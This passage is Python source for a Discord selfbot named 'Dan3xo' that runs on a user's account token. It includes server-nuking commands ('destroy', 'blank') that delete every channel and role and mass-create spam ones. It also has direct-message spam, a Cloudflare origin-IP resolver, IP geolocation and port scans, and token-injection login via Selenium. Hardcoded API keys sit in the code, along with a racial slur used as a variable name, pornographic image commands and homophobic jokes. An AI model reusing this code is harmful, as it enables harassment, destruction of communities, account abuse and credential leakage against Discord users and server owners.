 nigger = discord.Embed(title="**Geo Lookup**", description="```Status: "+ipjson["status"]+"\nCountry: "+ipjson["country"]+"\nRegion: "+ipjson["regionName"]+"\nCity: "+ipjson["city"]+"\nZip: "+str(ipjson["zip"])+"\nLat: "+str(ipjson["lat"])+"\nLon: "+str(ipjson["lon"])+"\nIsp: "+ipjson["isp"]+"\nOrg: "+ipjson["org"]+"\nAS: "+ipjson["as"]+"\nHostname: "+ipjson["reverse"]+"```", color=0xFF03A7)
 await ctx.send(embed=nigger)

#rainbow stats Embed
@Dan3xo.command()
async def r6(ctx, platform, name):
 r6stats = (f"https://r6.apitab.com/search/{platform}/{name}")
 response = requests.get(r6stats)
 resolve = response.json()
 username = resolve["p_name"]
 accountlevel = resolve["level"]
 Console = resolve["platform"]
 embed = discord.Embed(title="Rainbow Stats", description="Username %s\nAccount level %s\nConsole: %s"%(username,accountlevel,Console), color=discord.Color(int(color, 16)))
 await ctx.send(embed=embed)
 await ctx.message.delete()


import sr_api
randapi = sr_api.Client('') #This at the top where you define everything else


@Dan3xo.command()
async def wasted(ctx, member: discord.Member = None):
    member = member or ctx.author
    embed = discord.Embed(title=str(member), color=discord.Color(int(color, 16)))
    avatar = str(member.avatar_url_as(static_format="png"))
    image = await randapi.filter('wasted', avatar)
    embed.set_image(url="attachment://wasted.gif")
    file = discord.File(io.BytesIO(await image.read()), filename="wasted.gif")

    await ctx.send(embed=embed, file=file)

@Dan3xo.command()
async def skype(ctx, username):
    await ctx.message.delete()
    url = "https://discordapp.com/api/v6/users/@me/connections/skype/"+username+""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
        "Authorization": "{0}".format(token),
        "Content-Type": "application/json",
        "Host": "discordapp.com",
        "Content-Length": "44",
    }
    requests.put(url, headers=headers, data='{"name":"'+username+'","friend_sync":false}')
    await ctx.send("```Added Skype Connection! ["+username+"]```")


@Dan3xo.command()
async def hastebin(ctx, *, message):
    await ctx.message.delete()
    r = requests.post("https://hastebin.com/documents", data=message).json()
    await ctx.send(f"<https://hastebin.com/{r['key']}>")

#Dan3xo Penis Embed
@Dan3xo.command()
async def dick(ctx, *, user: discord.Member = None): 
 print('\033[97mCommand Used |\033[31m dick')
 await ctx.message.delete()
 if user is None:
     user = ctx.author
 size = random.randint(1, 15)
 dick = ""
 for _i in range(0, size):
     dick += "="
 embed = discord.Embed(title=f"{user.name}'s Dick Size :heart:", description=f"8{dick}D", color=0x000000)
 embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
 await ctx.send(embed=embed)

@Dan3xo.command()
async def gay(ctx, *, user: discord.Member = None): 
    if user is None:
        user = ctx.author
    size = random.randint(1, 100)
    embed = discord.Embed(title=f"How Gay Is {user.name}", description=f"{size}%", color=discord.Color(int(color, 16)))
    embed.set_thumbnail(url='https://i.etsystatic.com/7794831/r/il/c0da5e/869295516/il_794xN.869295516_k0g1.jpg')
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m gay')
    await ctx.message.delete()
    await ctx.send(embed=embed)

@Dan3xo.command()
async def simp(ctx, *, user: discord.Member = None): 
    if user is None:
        user = ctx.author
    size = random.randint(1, 100)
    embed = discord.Embed(title=f"{user.name} Is {size}% A Simp", description=f"", color=discord.Color(int(color, 16)))
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m simp')
    await ctx.message.delete()
    await ctx.send(embed=embed)



    
#Dan3xo CloudFlare Resolver Embed
@Dan3xo.command(pass_context=True)
async def cfres(beaters,domain):
        cfpage=("https://webresolver.nl/api.php?key=ICO8W-X3YA4-2O3TG-4AGSK&html=0&action=cloudflare&string="+domain)
        resp = requests.get(cfpage)
        embed = discord.Embed(title="CloudFlare Resolver", description=f"{resp.text}", color=discord.Color(int(color, 16)))
        embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
        print('\033[97mCommand Used |\033[31m cfres')
        await beaters.send(embed=embed)
        await beaters.message.delete()


@Dan3xo.command()
async def yesorno(ctx, question):
 print('\033[97mCommand Used |\033[31m yesorno')
 answers = ['yes', 'no']
 lol = (random.choice(answers))
 await ctx.send(f'**{question}:** {lol} ')


def RandomColor(): 
    randcolor = discord.Color(random.randint(0xe62e00, 0xFFFFFF))
    return randcolor

def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'

@Dan3xo.command()
async def nitro(ctx): 
    await ctx.message.delete()
    await ctx.send(Nitro())

def RandString():
    return "Aqua ON TOP"
@Dan3xo.command()
async def destroy(ctx):
 print('\033[97mCommand Used |\033[31m destroy')   
 await ctx.message.delete()
 for channel in list(ctx.guild.channels):
     try:
         await channel.delete()    
     except:
         pass   
 for role in list(ctx.guild.roles):
     try:
         await role.delete()
     except:
         pass
 try:
     await ctx.guild.edit(name=f"{name}")  
 except:
     pass        
 for _i in range(250):
     await ctx.guild.create_text_channel(name=RandString())
 for _i in range(250):
     await ctx.guild.create_role(name=RandString(), color=RandomColor())

@Dan3xo.command()
async def copy(ctx):
 print('\033[97mCommand Used |\033[31m copy') 
 await ctx.message.delete()
 await Dan3xo.create_guild(f'backup-{ctx.guild.name}')
 await asyncio.sleep(4)
 for g in Dan3xo.guilds:
     if f'backup-{ctx.guild.name}' in g.name:
         for c in g.channels:
             await c.delete()
         for cate in ctx.guild.categories:
             x = await g.create_category(f"{cate.name}")
             for chann in cate.channels:
                 if isinstance(chann, discord.VoiceChannel):
                     await x.create_voice_channel(f"{chann}")
                 if isinstance(chann, discord.TextChannel):
                     await x.create_text_channel(f"{chann}")
 try:                
     await g.edit(icon=ctx.guild.icon_url)
 except:
     pass

@Dan3xo.command()
async def blank(ctx):
 print('\033[97mCommand Used |\033[31m blank')   
 await ctx.message.delete()
 for channel in list(ctx.guild.channels):
     try:
         await channel.delete()    
     except:
         pass   
 for role in list(ctx.guild.roles):
     try:
         await role.delete()
     except:
         pass
 try:
     await ctx.guild.edit(name=f"{name}")  
 except:
     pass        


@Dan3xo.event
async def on_group_join(channel, user):
    if(str(user.id) in str(config['database']['remove'])):
        requests.delete("https://discordapp.com/api/v6/channels/%s/recipients/%s" 
            %(channel.id, user.id), headers=config['database']['header'])
    if(config['database']['kick'] == 1):
        removeListener(channel, user)

@Dan3xo.event
async def on_group_remove(channel, user):
    if(str(user.id) in str(config['database']['add'])):
        requests.put("https://discordapp.com/api/v6/channels/%s/recipients/%s" 
            %(channel.id, user.id), headers=config['database']['header'])     


#Dan3xo Spam User Command
@Dan3xo.command(name='spamuser', aliases=['spammailuser', 'spam-user'])
async def spamuser(ctx, user : discord.Member, *, text):
    try:
        await ctx.message.delete()
    except:
        pass
    for i in range(0, 10):
        await asyncio.sleep(.25)
        await user.send(text, delete_after=30)


#Dan3xo Whois Embed
@Dan3xo.command()
async def whois(beaters,ip):
        whoiscanurl = ("https://api.hackertarget.com/whois/?q="+ip)
        response = requests.get(whoiscanurl)
        embed = discord.Embed(title="Whois <3", description="%s"%(response.text), color=discord.Color(int(color, 16)))
        embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
        print('\033[97mCommand Used |\033[31m whois')
        await beaters.send(embed=embed)  
        await beaters.message.delete()

#Dan3xo Port Scan Embed
@Dan3xo.command(pass_context=True)
async def pscan(beaters,ip):
        portscanurl = ("https://api.hackertarget.com/nmap/?q="+ip)
        response = requests.get(portscanurl)
        embed = discord.Embed(title="Port Scan <3", description="%s"%(response.text), color=discord.Color(int(color, 16)))
        embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
        print('\033[97mCommand Used |\033[31m pscan')
        await beaters.send(embed=embed)
        await beaters.message.delete()

@Dan3xo.command()
async def add(ctx, num1: int, num2: int):
 print('\033[97mCommand Used |\033[31m add')
 await ctx.message.delete()
 answer = (num1 + num2)
 embed = discord.Embed(title="***Addition***", description=f"``{num1} + {num2} = {answer}``", color=discord.Color(int(color, 16)))
 embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
 await ctx.send(embed=embed)

@Dan3xo.command()
async def subtract(ctx, num1: int, num2: int):
 print('\033[97mCommand Used |\033[31m subtract')
 await ctx.message.delete()
 answer = (num1 - num2)
 embed = discord.Embed(title="***Subtraction***", description=f"``{num1} - {num2} = {answer}``", color=discord.Color(int(color, 16)))
 embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
 await ctx.send(embed=embed)

@Dan3xo.command()
async def divide(ctx, num1: int, num2: int):
 print('\033[97mCommand Used |\033[31m divide')
 await ctx.message.delete()
 answer = (num1 / num2)
 embed = discord.Embed(title="***Division***", description=f"``{num1} ÷ {num2} = {answer}``", color=discord.Color(int(color, 16)))
 embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
 await ctx.send(embed=embed)

@Dan3xo.command()
async def multiply(ctx, num1: int, num2: int):
 print('\033[97mCommand Used |\033[31m multiply')
 await ctx.message.delete()
 answer = (num1 * num2)
 embed = discord.Embed(title="***Multiplication***", description=f"``{num1} * {num2} = {answer}``", color=discord.Color(int(color, 16)))
 embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
 await ctx.send(embed=embed)
    

#Dan3xo Close Function
@Dan3xo.command(pass_context=True)
async def close(beaters):
    await beaters.message.delete()
    print("\033[31mShutting Down Selfbot")
    time.sleep.time(2)
    await Dan3xo.close()     
 


@Dan3xo.command()
async def dog(ctx): 
    await ctx.message.delete()
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    em = discord.Embed(title=f"Heres A Doggie", color=discord.Color(int(color, 16)))
    em.set_footer(text=f"{name}")
    em.set_image(url=str(r['message']))
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(str(r['message'])) 


@Dan3xo.command()
async def cat(ctx): 
    await ctx.message.delete()
    r = requests.get("https://api.thecatapi.com/v1/images/").json()
    em = discord.Embed(title=f"Heres A Cat", color=discord.Color(int(color, 16)))
    em.set_footer(text=f"{name}")
    em.set_image(url=str(r['message']))
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(str(r['message']))      

#Dan3xo Tits Embed
@Dan3xo.command()
async def tits(message, member: discord.Member = None):
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json() 
    embed = discord.Embed(title=f"{message.author.name} Gives {member.name} Titties :heart:", color=discord.Color(int(color, 16)))
    embed.set_image(url=res['url'])
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m tits')
    await message.send(embed=embed)
    await message.message.delete()

#@Dan3xo.command()
#async def wasted(message, member: discord.Member = None):
#    avatar = member.avatar_url
#    url = requests.get(f'https://some-random-api.ml/canvas/wasted?avatar={avatar}')
#    embed = discord.Embed(title=f"", color=discord.Color(int(color, 16)))
#    embed.set_image(url=url)
#    embedgeoset_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
#    print('\033[97mCommand Used |\033[31m wasted')
#    await message.send(embed=embed)
#    await message.message.delete()

@Dan3xo.command()
async def cuddle(message, member: discord.Member = None):
    r = requests.get("https://nekos.life/api/v2/img/cuddle")
    res = r.json() 
    embed = discord.Embed(title=f"{message.author.name} Cuddles {member.name} :heart:", color=discord.Color(int(color, 16)))
    embed.set_image(url=res['url'])
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m cuddle')
    await message.send(embed=embed)
    await message.message.delete()

@Dan3xo.command()
async def tickle(message, member: discord.Member = None):
    r = requests.get("https://nekos.life/api/v2/img/tickle")
    res = r.json() 
    embed = discord.Embed(title=f"{message.author.name} Tickles {member.name} :heart:", color=discord.Color(int(color, 16)))
    embed.set_image(url=res['url'])
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m tickle')
    await message.send(embed=embed)
    await message.message.delete()

#Dan3xo Hug Embed
@Dan3xo.command()
async def hug(message, member: discord.Member = None):
    r = requests.get("https://nekos.life/api/v2/img/hug")
    res = r.json() 
    embed = discord.Embed(title=f"{message.author.name} Hugs {member.name} :heart:", color=discord.Color(int(color, 16)))
    embed.set_image(url=res['url'])
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m hug')
    await message.send(embed=embed)
    await message.message.delete()

boobies = ["https://cdn.sex.com/images/pinporn/2014/07/07/6816552.gif?width=300", "https://cdn.sex.com/images/pinporn/2016/12/02/16992910.gif?width=300", "https://cdn.sex.com/images/pinporn/2016/10/06/16679838.gif?width=300", "https://cdn.sex.com/images/pinporn/2016/11/10/16878184.gif?width=300", "https://cdn.sex.com/images/pinporn/2015/04/09/11351604.gif?width=300", "https://cdn.sex.com/images/pinporn/2014/07/25/7138424.jpg?width=300", "https://cdn.sex.com/images/pinporn/2019/08/30/21727087.gif?width=300", "https://cdn.sex.com/images/pinporn/2015/02/08/10406677.gif?width=300", "https://usatsneakhype.files.wordpress.com/2014/04/boob-gifs-vs-butt-gifs-133.gif?w=1000", "https://thumb-p3.xhcdn.com/a/yo9T9GUxj8feI8smZuzqJg/000/212/370/283_1000.gif"]

@Dan3xo.command()
async def realboobs(message):
    embed = discord.Embed(title=f"Boobies :heart:", color=discord.Color(int(color, 16)))
    embed.set_image(url=random.choice(boobies))
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m realboobs')
    await message.send(embed=embed)
    await message.message.delete()

booty = ["https://cdn.sex.com/images/pinporn/2018/04/26/19413667.gif?width=300", "https://cdn.sex.com/images/pinporn/2015/06/25/12531454.gif?width=300", "https://cdn.sex.com/images/pinporn/2016/06/29/16031415.gif?width=300", "https://gifworld.s3.amazonaws.com/gifs/f162ca2f-5309-4874-8662-79b3d5125ee3.gif", "https://pornopics.co/photos/images/sexy-big-ass-gif-x-post-ranal-xxx-1422797.gif", "https://bootyoftheday.co/wp-content/uploads/2016/02/katvong-dominican-booty-shake-1.gif", "https://porngif.org/wp-content/uploads/2014/01/2144.gif", "https://namethatpornstar.com/imagecache/NTPS6jj6i3m8a5xs.gif", "https://www.gifmeat.com/wp-content/uploads/2017/04/Amazing-big-amateur-booty-ass-07.gif", "https://4.bp.blogspot.com/-QitOvHP0WLA/V0gdZxrT3cI/AAAAAAAAAWo/AeGCkM6viFM8SIlgUG6lLMd9MAsGxMcbACLcB/s1600/sexyass.gif", "https://pornopics.co/photos/images/-big-ass-booty-gif-1487101.gif"]

@Dan3xo.command()
async def realass(message):
    embed = discord.Embed(title=f"Ass :heart:", color=discord.Color(int(color, 16)))
    embed.set_image(url=random.choice(booty))
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/733796508540862495/761366043230076938/2mb.jpg?width=671&height=671')
    print('\033[97mCommand Used |\033[31m realass')
    await message.send(embed=embed)
    await message.message.delete()


kms = ["https://media.giphy.com/media/3o6ZtjOzPmwYelxmla/giphy.gif", "https://media1.tenor.com/images/cfb7817a23645120d4baba2dcb9205e0/tenor.gif", "https://data.whicdn.com/images/34503417/original.gif"]

@Dan3xo.command()
async def kill(message, member: discord.Member = None):
    embed = discord.Embed(title=f"{message.author.name} Killing {member.name}", color=discord.Color(int(color, 16)))
    embed.set_image(url=random.choice(kms))
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m kill')
    await message.send(embed=embed)
    await message.message.delete()


sadgif = ["https://i.pinimg.com/originals/73/b1/3b/73b13bcd2590cd93ca1ca9bbc7f917be.gif", "https://media.giphy.com/media/Ui7MfO6OaLz4k/giphy.gif", "https://media.giphy.com/media/ShPv5tt0EM396/giphy.gif", "https://66.media.tumblr.com/5b4e0848d8080db04dbfedf31a4869e2/tumblr_inline_or4whcrg1z1ueut6r_540.gif", "https://mrwgifs.com/wp-content/uploads/2013/05/Dramatic-Crying-In-Anime-Gif.gif", "https://i.kym-cdn.com/photos/images/original/001/117/651/432.gif"]

@Dan3xo.command()
async def sad(message):
    embed = discord.Embed(title=f"Im Sad :(", color=discord.Color(int(color, 16)))
    embed.set_image(url=random.choice(sadgif))
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m sad')
    await message.send(embed=embed)
    await message.message.delete()

skidgif = ["https://media2.giphy.com/media/YQitE4YNQNahy/giphy-downsized-large.gif", "https://media0.giphy.com/media/115BJle6N2Av0A/200.gif", "https://lh3.googleusercontent.com/proxy/iD3YS9n7wotJQN7fj3GBHTyURz8rjStiC-x-SXIZkT1H94DLZbCgZgD8wnUz4d5n1cGZhJIzju5TLOw29EifbJ9yvOrefdieRJYzq9AfWMK6WUsFzI1wurPjeu7W6AhcbGovlajIG3IlyWxZfg", "https://webpoint.fi/gif/retard.gif"]

@Dan3xo.command()
async def skid(message, member: discord.Member = None):
    embed = discord.Embed(title=f"{message.author.name} Said {member.name} A Skid :clown:", color=discord.Color(int(color, 16)))
    embed.set_image(url=random.choice(skidgif))
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m skid')
    await message.send(embed=embed)
    await message.message.delete()

@Dan3xo.command()
async def fnstats(ctx, user):
 await ctx.message.delete()
 url = f"https://fortnite-api.p.rapidapi.com/stats/{user}"
 headers = {
     'x-rapidapi-host': "fortnite-api.p.rapidapi.com",
     'x-rapidapi-key': "a1aa3adab2mshc8b022a361da94dp1661e5jsned241bd0e712"
     }
 response = requests.get(url, headers=headers)
 data = response.json()
 embed = discord.Embed(title=f"{user} Fortnite Stats", color=discord.Color(int(color, 16)))
 embed.add_field(name="Name:", value=f'{user}', inline=True)
 embed.add_field(name="Kills:", value=data['lifetime']['all']['all']['kills'], inline=True)
 embed.add_field(name="Matches Played:", value=data['lifetime']['all']['all']['matchesplayed'], inline=True)
 embed.add_field(name="Place Top 1:", value=data['lifetime']['all']['all']['placetop1'], inline=True)
 embed.add_field(name="Place Top 25:", value=data['lifetime']['all']['all']['placetop25'], inline=True)
 embed.add_field(name="KPM:", value=data['lifetime']['all']['all']['killsPerMatch'], inline=True)
 embed.add_field(name="KD:", value=data['lifetime']['all']['all']['kdr'], inline=True)
 embed.add_field(name="Win Rate:", value=data['lifetime']['all']['all']['winrate'], inline=True)
 embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
 await ctx.send(embed=embed)



#Dan3xo Pat Embed
@Dan3xo.command()
async def pat(message, member: discord.Member = None):
    r = requests.get("https://nekos.life/api/v2/img/pat")
    res = r.json() 
    embed = discord.Embed(title=f"{message.author.name} Pats {member.name} :heart:", color=discord.Color(int(color, 16)))
    embed.set_image(url=res['url'])
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m pat')
    await message.send(embed=embed)
    await message.message.delete()   

    
#Dan3xo kiss Embed
@Dan3xo.command()
async def kiss(message, member: discord.Member = None):
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json() 
    embed = discord.Embed(title=f"{message.author.name} Kisses {member.name} :heart:", color=discord.Color(int(color, 16)))
    embed.set_image(url=res['url'])
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m kiss')
    await message.send(embed=embed)
    await message.message.delete()

@Dan3xo.command()
async def insult(message, member: discord.Member = None):
    r = requests.get('https://insult.mattbas.org/api/insult').text
    embed = discord.Embed(title=f"{message.author.name} Insults {member.name}", description=f"{r}", color=discord.Color(int(color, 16)))
    embed.set_footer(text=f"{name}", icon_url=f'https://cdn.discordapp.com/attachments/737510848628654092/737889925231280188/image0.jpg')
    print('\033[97mCommand Used |\033[31m insult')
    await message.send(embed=embed)
    await message.message.delete()




@Dan3xo.command()
async def ghost(ctx, member: discord.Member = None):
 print('\033[97mCommand Used |\033[31m ghost')
 ment = member.mention
 await ctx.message.delete()
 await ctx.send(f"{ment}", delete_after=0.1)

@Dan3xo.command()
async def dox(ctx, member: discord.Member = None):
    await ctx.message.delete()
    await ctx.send(f"**{member}'s Information Will Be Sent To Your DM's** :smiling_imp:")


@Dan3xo.command(name='1337-speak', aliases=['1337speak'])
async def _1337_speak(ctx, *, text):
    await ctx.message.delete()
    text = text.replace('a', '4').replace('A', '4').replace('e', '3')\
            .replace('E', '3').replace('i', '!').replace('I', '!')\
            .replace('o', '0').replace('O', '0').replace('u', '|_|').replace('U', '|_|')
    await ctx.send(f'`{text}`')


@Dan3xo.command()
async def meme(message):
 r = requests.get("https://meme-api.herokuapp.com/gimme")
 res = r.json() 
 embed = discord.Embed(title=f"", color=discord.Color(int(color, 16)))
 embed.set_image(url=res['url'])
 embed.set_footer(text=f"{name}", icon_url=f'https://cdn.discordapp.com/attachments/737510848628654092/737889925231280188/image0.jpg')
 print('\033[97mCommand Used |\033[31m meme')
 await message.send(embed=embed)
 await message.message.delete()


@Dan3xo.command(aliases=['emojistealall', 'stealallemojis'])
async def emojiall(ctx):
    await ctx.message.delete()
    for guild in Dan3xo.guilds:
        for emoji in guild.emojis:
            with open(f"Images/Emojis/{emoji.name}.png", 'wb') as f:
                r = requests.get(f'https://cdn.discordapp.com/emojis/{emoji.id}.png')
                f.write(r.content)
    await ctx.send('Done saving all server Emojis!', delete_after=3)

@Dan3xo.command(aliases=['emojisteal', 'stealemojis'])
async def emoji_steal(ctx):
    await ctx.message.delete()
    for emoji in ctx.guild.emojis:
        try:
            filename = f"Images/Emojis/{ctx.guild.name}/"
            os.makedirs(os.path.dirname(filename), exist_ok=True)
            with open(f"Images/Emojis/{ctx.guild.name}/{emoji.name}.png", 'wb') as f:
                r = requests.get(f'https://cdn.discordapp.com/emojis/{emoji.id}.png')
                f.write(r.content)
        except:
            filename = f"Images/Emojis/{ctx.guild.name}/"
            with open(f"Images/Emojis/{emoji.name}.png", 'wb') as f:
                r = requests.get(f'https://cdn.discordapp.com/emojis/{emoji.id}.png')
                f.write(r.content)


@Dan3xo.command()
async def annoy(ctx, member: discord.Member=None, number: int=5):
    if number > 5:
        number = 5
    member = member or ctx.author
    try:
        await ctx.message.delete()
    except discord.Forbidden:
        pass
    if member != None:
        for x in range(number):
            await ctx.channel.trigger_typing()
            await ctx.send(member.mention)
            await asyncio.sleep(6)
#Dan3xo slap Embed
@Dan3xo.command()
async def slap(message, member: discord.Member = None):
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json() 
    embed = discord.Embed(title=f"{message.author.name} Slaps TF Outa {member.name} :heart:", color=discord.Color(int(color, 16)))
    embed.set_image(url=res['url'])
    embed.set_footer(text=f"{name}", icon_url=f'https://cdn.discordapp.com/attachments/737510848628654092/737889925231280188/image0.jpg')
    print('\033[97mCommand Used |\033[31m slap')
    await message.send(embed=embed)
    await message.message.delete()

@Dan3xo.command()
async def alexa(message, member: discord.Member = None):
    embed = discord.Embed(title=f"{message.author.name} Says {member.name} A Skeeed :heart:", color=discord.Color(int(color, 16)))
    embed.set_image(url='https://cdn.discordapp.com/attachments/724187765360820245/726238128645472296/456456.png')
    embed.set_footer(text=f"{name}", icon_url=f'https://cdn.discordapp.com/attachments/737510848628654092/737889925231280188/image0.jpg')
    print('\033[97mCommand Used |\033[31m alexa')
    await message.send(embed=embed)
    await message.message.delete()


#Dan3xo BlowJob Embed
@Dan3xo.command()
async def blowjob(message):
    await message.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    embed = discord.Embed()
    embed = discord.Embed(title=f" Heres A BlowJob :heart:", color=discord.Color(int(color, 16)))
    embed.set_image(url=res['url'])
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')    
    await message.send(embed=embed)
    await message.message.delete()


#Dan3xo Boobs Embed
@Dan3xo.command()
async def boobs(message):
    await message.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    embed = discord.Embed()
    embed = discord.Embed(title=f" Heres Some Boobs :heart:", color=discord.Color(int(color, 16)))
    embed.set_image(url=res['url'])
    embed.set_footer(text=f"{name}", icon_url=f'https://cdn.discordapp.com/attachments/737510848628654092/737889925231280188/image0.jpg')    
    await message.send(embed=embed)
    await message.message.delete()
    
#Dan3xo BlowJob Embed
@Dan3xo.command()
async def anal(message):
    await message.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/anal")
    res = r.json()
    embed = discord.Embed()
    embed = discord.Embed(title=f" Heres Some Anal :heart:", color=discord.Color(int(color, 16)))
    embed.set_image(url=res['url'])
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')    
    await message.send(embed=embed)
    await message.message.delete()

#Dan3xo Fucking Your Mom embed
@Dan3xo.command(pass_context=True)
async def fuck(beaters, member: discord.Member = None):
        member = beaters.author if not member else member
        embed = discord.Embed(title=f"Dan3xo Fucking The Shit Outa {member} Mom :kissing_heart:", description="", color=discord.Color(int(color, 16)))
        embed.set_image(url="https://thumb-p4.xhcdn.com/a/R292lF5ESNf4icujFKO4Aw/000/116/650/774_450.gif"),
        embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
        await beaters.send(embed=embed)
        await beaters.message.delete()



@Dan3xo.command()
async def embed(ctx, *, message):
    em = discord.Embed(color=random.randint(0, 0xFFFFFF))
    em.description = message
    print('\033[97mCommand Used |\033[31m embed')
    await ctx.message.delete()
    await ctx.send(embed=em)

@Dan3xo.command()
async def login(ctx, token):
 print('\033[97mCommand Used |\033[31m login')
 await ctx.message.delete()
 opts = webdriver.ChromeOptions()
 opts.add_experimental_option("detach", True)
 driver = webdriver.Chrome('chromedriver.exe', options=opts)
 script = """
         function login(token) {
         setInterval(() => {
         document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
         }, 50);
         setTimeout(() => {
         location.reload();
         }, 2500);
         }   
         """
 driver.get("https://discordapp.com/login")
 driver.execute_script(script+f'\nlogin("{token}")')

#Dan3xo user Info Embed
@Dan3xo.command(pass_context=True)
async def info(beaters, member: discord.Member = None):
        embed = discord.Embed(title=f"***User Info***", color=discord.Color(int(color, 16)))
        embed.add_field(name="`User ID:`", value=member.id, inline=False)
        embed.add_field(name="`Name:`", value=member.display_name, inline=False)
        embed.add_field(name="`Creation Date:`", value=member.created_at.strftime("%a, %d %B %Y, %I:%M %p"), inline=False)
        embed.add_field(name="`Bot Check`", value=member.bot, inline=False)
        embed.set_thumbnail(url=member.avatar_url)
        embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
        print('\033[97mCommand Used |\033[31m info')
        await beaters.send(embed=embed)
        await beaters.message.delete()

#Dan3xo Server Info Embed
@Dan3xo.command()
async def serverinfo(ctx):
        embed = discord.Embed(title="***Server Info***", color=discord.Color(int(color, 16)))
        embed.add_field(name="`Server ID:`", value=ctx.guild.id, inline=False)
        embed.add_field(name="`Server Name:`", value=ctx.guild.name, inline=False)
        embed.add_field(name="`Server Owner:`", value=ctx.guild.owner.display_name, inline=False)
        embed.add_field(name="`Creation Date:`", value=ctx.guild.created_at.strftime("%a, %d %B %Y, %I:%M %p"), inline=False)
        embed.add_field(name="`Members:`", value=len(ctx.guild.members), inline=False)
        embed.add_field(name="`Roles:`", value=len(ctx.guild.roles), inline=False)
        embed.set_thumbnail(url=ctx.guild.icon_url)
